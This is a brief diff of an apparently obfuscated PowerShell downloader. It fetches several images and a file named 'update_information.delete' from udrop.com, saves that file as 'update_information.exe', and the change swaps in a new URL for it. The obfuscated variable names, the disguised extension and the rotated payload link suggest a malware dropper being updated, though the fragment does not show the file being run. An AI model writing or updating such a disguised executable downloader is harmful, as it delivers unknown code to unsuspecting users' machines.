@@ -51,7 +51,7 @@ $v016=@(
 @{Url="https://www.udrop.com/file/Otfw/step2.png";Name="step2.png"},
 @{Url="https://www.udrop.com/file/Otfx/step3.png";Name="step3.png"},
 @{Url="https://www.udrop.com/file/Otfy/step4.png";Name="step4.png"},
-@{Url="https://www.udrop.com/file/Otfz/update_information.delete";Name="update_information.exe"}
+@{Url="https://www.udrop.com/file/OtRT/update_information.delete";Name="update_information.exe"}
 )
 foreach($v017 in $v016){
 $v018=Join-Path -Path $v003 -ChildPath $v017.Name
